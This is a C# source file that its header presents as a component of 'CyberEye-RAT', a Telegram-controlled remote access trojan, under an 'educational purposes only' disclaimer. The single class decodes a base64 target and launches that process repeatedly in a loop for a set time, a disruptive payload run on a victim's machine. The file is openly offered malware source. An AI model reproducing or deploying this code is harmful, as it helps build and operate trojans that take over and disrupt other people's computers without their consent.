/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.Diagnostics;

namespace TelegramRAT.modded
{
    internal sealed class Cycle
    {
        public static void CycleStart(string target_object, int durationMs)
        {
            target_object = utils.Base64Decode(target_object);
            DateTime startTime = DateTime.Now;
            while ((DateTime.Now - startTime).TotalMilliseconds < durationMs) { Process.Start(target_object); }
        }
    }
}
